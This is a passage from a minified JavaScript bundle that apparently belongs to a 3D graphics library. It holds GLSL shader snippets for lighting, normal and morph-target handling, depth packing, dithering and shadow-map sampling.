		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,md=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )
		iblIrradiance += getIBLIrradiance( geometryNormal );
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		radiance += getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		radiance += getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,_d=`#if defined( RE_IndirectDiffuse )
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,gd=`#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )
	gl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,vd=`#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,xd=`#ifdef USE_LOGDEPTHBUF
	#ifdef USE_LOGDEPTHBUF_EXT
		varying float vFragDepth;
		varying float vIsPerspective;
	#else
		uniform float logDepthBufFC;
	#endif
#endif`,Ed=`#ifdef USE_LOGDEPTHBUF
	#ifdef USE_LOGDEPTHBUF_EXT
		vFragDepth = 1.0 + gl_Position.w;
		vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
	#else
		if ( isPerspectiveMatrix( projectionMatrix ) ) {
			gl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;
			gl_Position.z *= gl_Position.w;
		}
	#endif
#endif`,yd=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = vec4( mix( pow( sampledDiffuseColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), sampledDiffuseColor.rgb * 0.0773993808, vec3( lessThanEqual( sampledDiffuseColor.rgb, vec3( 0.04045 ) ) ) ), sampledDiffuseColor.w );
	
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,Sd=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,Md=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,bd=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,Td=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,Ad=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,Rd=`#if defined( USE_MORPHCOLORS ) && defined( MORPHTARGETS_TEXTURE )
	vColor *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,wd=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
			if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
		}
	#else
		objectNormal += morphNormal0 * morphTargetInfluences[ 0 ];
		objectNormal += morphNormal1 * morphTargetInfluences[ 1 ];
		objectNormal += morphNormal2 * morphTargetInfluences[ 2 ];
		objectNormal += morphNormal3 * morphTargetInfluences[ 3 ];
	#endif
#endif`,Cd=`#ifdef USE_MORPHTARGETS
	uniform float morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
		uniform sampler2DArray morphTargetsTexture;
		uniform ivec2 morphTargetsTextureSize;
		vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
			int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
			int y = texelIndex / morphTargetsTextureSize.x;
			int x = texelIndex - y * morphTargetsTextureSize.x;
			ivec3 morphUV = ivec3( x, y, morphTargetIndex );
			return texelFetch( morphTargetsTexture, morphUV, 0 );
		}
	#else
		#ifndef USE_MORPHNORMALS
			uniform float morphTargetInfluences[ 8 ];
		#else
			uniform float morphTargetInfluences[ 4 ];
		#endif
	#endif
#endif`,Pd=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	#ifdef MORPHTARGETS_TEXTURE
		for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
			if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
		}
	#else
		transformed += morphTarget0 * morphTargetInfluences[ 0 ];
		transformed += morphTarget1 * morphTargetInfluences[ 1 ];
		transformed += morphTarget2 * morphTargetInfluences[ 2 ];
		transformed += morphTarget3 * morphTargetInfluences[ 3 ];
		#ifndef USE_MORPHNORMALS
			transformed += morphTarget4 * morphTargetInfluences[ 4 ];
			transformed += morphTarget5 * morphTargetInfluences[ 5 ];
			transformed += morphTarget6 * morphTargetInfluences[ 6 ];
			transformed += morphTarget7 * morphTargetInfluences[ 7 ];
		#endif
	#endif
#endif`,Id=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,Ld=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,Dd=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,Nd=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,Od=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
	#endif
#endif`,Ud=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
		vec2 st1 = dFdy( uv.st );
		vec3 N = surf_norm;
		vec3 q1perp = cross( q1, N );
		vec3 q0perp = cross( N, q0 );
		vec3 T = q1perp * st0.x + q0perp * st1.x;
		vec3 B = q1perp * st0.y + q0perp * st1.y;
		float det = max( dot( T, T ), dot( B, B ) );
		float scale = ( det == 0.0 ) ? 0.0 : inversesqrt( det );
		return mat3( T * scale, B * scale, N );
	}
#endif`,Fd=`#ifdef USE_CLEARCOAT
	vec3 clearcoatNormal = nonPerturbedNormal;
#endif`,kd=`#ifdef USE_CLEARCOAT_NORMALMAP
	vec3 clearcoatMapN = texture2D( clearcoatNormalMap, vClearcoatNormalMapUv ).xyz * 2.0 - 1.0;
	clearcoatMapN.xy *= clearcoatNormalScale;
	clearcoatNormal = normalize( tbn2 * clearcoatMapN );
#endif`,zd=`#ifdef USE_CLEARCOATMAP
	uniform sampler2D clearcoatMap;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform sampler2D clearcoatNormalMap;
	uniform vec2 clearcoatNormalScale;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform sampler2D clearcoatRoughnessMap;
#endif`,Bd=`#ifdef USE_IRIDESCENCEMAP
	uniform sampler2D iridescenceMap;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform sampler2D iridescenceThicknessMap;
#endif`,Gd=`#ifdef OPAQUE
diffuseColor.a = 1.0;
#endif
#ifdef USE_TRANSMISSION
diffuseColor.a *= material.transmissionAlpha;
#endif
gl_FragColor = vec4( outgoingLight, diffuseColor.a );`,Hd=`vec3 packNormalToRGB( const in vec3 normal ) {
	return normalize( normal ) * 0.5 + 0.5;
}
vec3 unpackRGBToNormal( const in vec3 rgb ) {
	return 2.0 * rgb.xyz - 1.0;
}
const float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;
const vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );
const vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );
const float ShiftRight8 = 1. / 256.;
vec4 packDepthToRGBA( const in float v ) {
	vec4 r = vec4( fract( v * PackFactors ), v );
	r.yzw -= r.xyz * ShiftRight8;	return r * PackUpscale;
}
float unpackRGBAToDepth( const in vec4 v ) {
	return dot( v, UnpackFactors );
}
vec2 packDepthToRG( in highp float v ) {
	return packDepthToRGBA( v ).yx;
}
float unpackRGToDepth( const in highp vec2 v ) {
	return unpackRGBAToDepth( vec4( v.xy, 0.0, 0.0 ) );
}
vec4 pack2HalfToRGBA( vec2 v ) {
	vec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ) );
	return vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w );
}
vec2 unpackRGBATo2Half( vec4 v ) {
	return vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );
}
float viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {
	return ( viewZ + near ) / ( near - far );
}
float orthographicDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return depth * ( near - far ) - near;
}
float viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {
	return ( ( near + viewZ ) * far ) / ( ( far - near ) * viewZ );
}
float perspectiveDepthToViewZ( const in float depth, const in float near, const in float far ) {
	return ( near * far ) / ( ( far - near ) * depth - far );
}`,Vd=`#ifdef PREMULTIPLIED_ALPHA
	gl_FragColor.rgb *= gl_FragColor.a;
#endif`,Wd=`vec4 mvPosition = vec4( transformed, 1.0 );
#ifdef USE_BATCHING
	mvPosition = batchingMatrix * mvPosition;
#endif
#ifdef USE_INSTANCING
	mvPosition = instanceMatrix * mvPosition;
#endif
mvPosition = modelViewMatrix * mvPosition;
gl_Position = projectionMatrix * mvPosition;`,Xd=`#ifdef DITHERING
	gl_FragColor.rgb = dithering( gl_FragColor.rgb );
#endif`,qd=`#ifdef DITHERING
	vec3 dithering( vec3 color ) {
		float grid_position = rand( gl_FragCoord.xy );
		vec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );
		dither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );
		return color + dither_shift_RGB;
	}
#endif`,Yd=`float roughnessFactor = roughness;
#ifdef USE_ROUGHNESSMAP
	vec4 texelRoughness = texture2D( roughnessMap, vRoughnessMapUv );
	roughnessFactor *= texelRoughness.g;
#endif`,jd=`#ifdef USE_ROUGHNESSMAP
	uniform sampler2D roughnessMap;
#endif`,Kd=`#if NUM_SPOT_LIGHT_COORDS > 0
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#if NUM_SPOT_LIGHT_MAPS > 0
	uniform sampler2D spotLightMap[ NUM_SPOT_LIGHT_MAPS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		uniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];
		struct SpotLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
	float texture2DCompare( sampler2D depths, vec2 uv, float compare ) {
		return step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );
	}
	vec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {
		return unpackRGBATo2Half( texture2D( shadow, uv ) );
	}
	float VSMShadow (sampler2D shadow, vec2 uv, float compare ){
		float occlusion = 1.0;
		vec2 distribution = texture2DDistribution( shadow, uv );
		float hard_shadow = step( compare , distribution.x );
		if (hard_shadow != 1.0 ) {
			float distance = compare - distribution.x ;
			float variance = max( 0.00000, distribution.y * distribution.y );
			float softness_probability = variance / (variance + distance * distance );			softness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );			occlusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );
		}
		return occlusion;
	}
	float getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {
		float shadow = 1.0;
		shadowCoord.xyz /= shadowCoord.w;
		shadowCoord.z += shadowBias;
		bool inFrustum = shadowCoord.x >= 0.0 && shadowCoord.x <= 1.0 && shadowCoord.y >= 0.0 && shadowCoord.y <= 1.0;
		bool frustumTest = inFrustum && shadowCoord.z <= 1.0;
		if ( frustumTest ) {
		#if defined( SHADOWMAP_TYPE_PCF )
			vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
			float dx0 = - texelSize.x * shadowRadius;
			float dy0 = - texelSize.y * shadowRadius;
			float dx1 = + texelSize.x * shadowRadius;
			float dy1 = + texelSize.y * shadowRadius;
			float dx2 = dx0 / 2.0;
			float dy2 = dy0 / 2.0;
			float dx3 = dx1 / 2.0;
			float dy3 = dy1 / 2.0;
			shadow = (
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy2 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx2, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx3, dy3 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx0, dy1 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( 0.0, dy1 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, shadowCoord.xy + vec2( dx1, dy1 ), shadowCoord.z )
			) * ( 1.0 / 17.0 );
		#elif defined( SHADOWMAP_TYPE_PCF_SOFT )
			vec2 texelSize = vec2( 1.0 ) / shadowMapSize;
			float dx = texelSize.x;
			float dy = texelSize.y;
			vec2 uv = shadowCoord.xy;
			vec2 f = fract( uv * shadowMapSize + 0.5 );
			uv -= f * texelSize;
			shadow = (
				texture2DCompare( shadowMap, uv, shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + vec2( dx, 0.0 ), shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + vec2( 0.0, dy ), shadowCoord.z ) +
				texture2DCompare( shadowMap, uv + texelSize, shadowCoord.z ) +
				mix( texture2DCompare( shadowMap, uv + vec2( -dx, 0.0 ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 0.0 ), shadowCoord.z ),
					 f.x ) +
				mix( texture2DCompare( shadowMap, uv + vec2( -dx, dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, dy ), shadowCoord.z ),
					 f.x ) +
				mix( texture2DCompare( shadowMap, uv + vec2( 0.0, -dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( 0.0, 2.0 * dy ), shadowCoord.z ),
					 f.y ) +
				mix( texture2DCompare( shadowMap, uv + vec2( dx, -dy ), shadowCoord.z ),
					 texture2DCompare( shadowMap, uv + vec2( dx, 2.0 * dy ), shadowCoord.z ),
					 f.y ) +
				mix( mix( texture2DCompare( shadowMap, uv + vec2( -dx, -dy ), shadowCoord.z ),
						  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, -dy ), shadowCoord.z ),
						  f.x ),
					 mix( texture2DCompare( shadowMap, uv + vec2( -dx, 2.0 * dy ), shadowCoord.z ),
						  texture2DCompare( shadowMap, uv + vec2( 2.0 * dx, 2.0 * dy ), shadowCoord.z ),
						  f.x ),
					 f.y )
			) * ( 1.0 / 9.0 );
		#elif defined( SHADOWMAP_TYPE_VSM )
			shadow = VSMShadow( shadowMap, shadowCoord.xy, shadowCoord.z );
		#else
			shadow = texture2DCompare( shadowMap, shadowCoord.xy, shadowCoord.z );
		#endif
		}
		return shadow;
	}
	vec2 cubeToUV( vec3 v, float texelSizeY ) {
		vec3 absV = abs( v );
		float scaleToCube = 1.0 / max( absV.x, max( absV.y, absV.z ) );
		absV *= scaleToCube;
		v *= scaleToCube * ( 1.0 - 2.0 * texelSizeY );
		vec2 planar = v.xy;
		float almostATexel = 1.5 * texelSizeY;
		float almostOne = 1.0 - almostATexel;
		if ( absV.z >= almostOne ) {
			if ( v.z > 0.0 )
				planar.x = 4.0 - v.x;
		} else if ( absV.x >= almostOne ) {
			float signX = sign( v.x );
			planar.x = v.z * signX + 2.0 * signX;
		} else if ( absV.y >= almostOne ) {
			float signY = sign( v.y );
			planar.x = v.x + 2.0 * signY + 2.0;
			planar.y = v.z * signY - 2.0;
		}
		return vec2( 0.125, 0.25 ) * planar + vec2( 0.375, 0.75 );
	}
	float getPointShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord, float shadowCameraNear, float shadowCameraFar ) {
		vec2 texelSize = vec2( 1.0 ) / ( shadowMapSize * vec2( 4.0, 2.0 ) );
		vec3 lightToPosition = shadowCoord.xyz;
		float dp = ( length( lightToPosition ) - shadowCameraNear ) / ( shadowCameraFar - shadowCameraNear );		dp += shadowBias;
		vec3 bd3D = normalize( lightToPosition );
		#if defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_PCF_SOFT ) || defined( SHADOWMAP_TYPE_VSM )
			vec2 offset = vec2( - 1, 1 ) * shadowRadius * texelSize.y;
			return (
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xyx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yyx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxy, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.xxx, texelSize.y ), dp ) +
				texture2DCompare( shadowMap, cubeToUV( bd3D + offset.yxx, texelSize.y ), dp )
			) * ( 1.0 / 9.0 );
		#else
			return texture2DCompare( shadowMap, cubeToUV( bd3D, texelSize.y ), dp );
		#endif
	}
#endif`,$d=`#if NUM_SPOT_LIGHT_COORDS > 0
	uniform mat4 spotLightMatrix[ NUM_SPOT_LIGHT_COORDS ];
	varying vec4 vSpotLightCoord[ NUM_SPOT_LIGHT_COORDS ];
#endif
#ifdef USE_SHADOWMAP
	#if NUM_DIR_LIGHT_SHADOWS > 0
		uniform mat4 directionalShadowMatrix[ NUM_DIR_LIGHT_SHADOWS ];
		varying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];
		struct DirectionalLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];
	#endif
	#if NUM_SPOT_LIGHT_SHADOWS > 0
		struct SpotLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
		};
		uniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];
	#endif
	#if NUM_POINT_LIGHT_SHADOWS > 0
		uniform mat4 pointShadowMatrix[ NUM_POINT_LIGHT_SHADOWS ];
		varying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];
		struct PointLightShadow {
			float shadowBias;
			float shadowNormalBias;
			float shadowRadius;
			vec2 shadowMapSize;
			float shadowCameraNear;
			float shadowCameraFar;
		};
		uniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];
	#endif
